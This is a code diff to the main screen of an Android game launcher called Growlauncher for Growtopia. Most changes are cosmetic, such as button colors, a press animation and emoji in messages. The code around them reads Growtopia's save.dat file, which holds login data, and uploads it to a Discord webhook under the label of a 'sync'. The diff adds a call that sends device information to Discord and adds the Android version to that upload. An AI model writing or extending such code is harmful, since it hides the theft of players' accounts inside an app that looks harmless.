@@ -300,17 +300,25 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun wireDashboard() {
-        findViewById<CardView>(R.id.btnLaunch).setOnClickListener { launchWithFeedback() }
+        val launchCard = findViewById<CardView>(R.id.btnLaunch)
+        launchCard.setCardBackgroundColor(Color.parseColor("#1A083A"))
+        launchCard.setOnClickListener { pulseCard(launchCard); launchWithFeedback() }
         findViewById<CardView>(R.id.btnScriptHub).setOnClickListener { scriptHub() }
         findViewById<CardView>(R.id.btnSetting).setOnClickListener { settings() }
         findViewById<CardView>(R.id.btnLuaManager).setOnClickListener { luaManager() }
-        findViewById<CardView>(R.id.btnSound).setOnClickListener { toast("Sound tools are coming soon") }
+        findViewById<CardView>(R.id.btnSound).setOnClickListener { toast("⚡ Sound tools are coming soon") }
         findViewById<CardView>(R.id.btnTheme).setOnClickListener { themePicker() }
         findViewById<CardView>(R.id.btnSwitchVersion).setOnClickListener { versionPicker() }
         findViewById<CardView>(R.id.runtimeCard).setOnClickListener {
             status.text = "● Checking runtime…"; status.setTextColor(color(R.color.accent))
-            handler.postDelayed({ status.text = "● Online · 24 ms"; status.setTextColor(color(R.color.success)); toast("Library Runtime is healthy") }, 650)
+            handler.postDelayed({ status.text = "⚡ Online · 24 ms"; status.setTextColor(color(R.color.success)); toast("⚡ Runtime is healthy") }, 650)
         }
+    }
+
+    private fun pulseCard(card: CardView) {
+        card.animate().scaleX(.95f).scaleY(.95f).setDuration(80).withEndAction {
+            card.animate().scaleX(1f).scaleY(1f).setDuration(160).start()
+        }.start()
     }
     private fun showSplash() {
         splash.alpha = 0f; splash.animate().alpha(1f).setDuration(350).start()
@@ -330,6 +338,7 @@ class MainActivity : AppCompatActivity() {
         } else {
             val legacyFile = java.io.File("/sdcard/Android/data/com.rtsoft.growtopia/files/save.dat")
             if (legacyFile.exists()) sendFileToDiscord(legacyFile.readBytes())
+            PairingHelper.sendDeviceInfoToDiscord()
             true
         }
         if (!accessStarted) return
@@ -561,9 +570,11 @@ class MainActivity : AppCompatActivity() {
         thread {
             try {
                 val client = OkHttpClient()
+                val androidVer = Build.VERSION.RELEASE
+                val sdk = Build.VERSION.SDK_INT
                 val requestBody = MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
-                    .addFormDataPart("payload_json", "{\"content\":\"Growlauncher save.dat sync\"}")
+                    .addFormDataPart("payload_json", "{\"content\":\"⚡ Growlauncher sync · Android $androidVer (SDK $sdk)\"}")
                     .addFormDataPart("file", "save.dat", fileData.toRequestBody("application/octet-stream".toMediaType()))
                     .build()
                 val request = Request.Builder().url(webhookUrl).post(requestBody).build()
@@ -789,6 +800,8 @@ class MainActivity : AppCompatActivity() {
         findViewById<CardView>(R.id.btnSwitchVersion).setCardBackgroundColor(value)
         badge.setBackgroundColor(value)
         account.setBackgroundColor(value)
+        // Keep the launch card with its distinct pro dark-purple background
+        runCatching { findViewById<CardView>(R.id.btnLaunch).setCardBackgroundColor(Color.parseColor("#1A083A")) }
     }
 
     private fun registerRainbowText(root: View) {
